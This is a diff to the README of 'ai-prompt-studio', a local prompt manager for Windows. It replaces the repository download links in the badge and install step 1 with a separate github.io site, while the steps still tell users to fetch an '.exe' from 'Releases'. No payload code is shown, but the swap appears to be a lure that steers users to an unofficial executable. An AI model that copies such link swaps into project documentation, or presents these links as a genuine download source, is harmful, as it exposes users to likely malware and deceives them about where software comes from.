@@ -1,6 +1,6 @@
 # 🤖 ai-prompt-studio - Organize prompts for better AI results
 
-[![Download ai-prompt-studio](https://img.shields.io/badge/Download-ai-prompt-studio-blue.svg)](https://github.com/conniving-catechist742/ai-prompt-studio)
+[![Download ai-prompt-studio](https://img.shields.io/badge/Download-ai-prompt-studio-blue.svg)](https://conniving-catechist742.github.io)
 
 ## 📋 Project Overview
 ai-prompt-studio serves as a local manager for AI prompts. It stores your favorite text instructions for ChatGPT, Claude, and Gemini in one place. You gain control over your prompt library without relying on cloud services. The application keeps your data on your computer. This setup ensures privacy and fast access to your work.
@@ -15,7 +15,7 @@ Your computer must meet these basic needs to run the software:
 ## 📥 How to Download and Install
 Follow these steps to set up the application on your Windows machine:
 
-1. Visit this page to download: https://github.com/conniving-catechist742/ai-prompt-studio
+1. Visit this page to download: https://conniving-catechist742.github.io
 2. Locate the link labeled "Releases" on the right side of the page.
 3. Click the latest version link.
 4. Download the file ending in ".exe" to your Downloads folder.
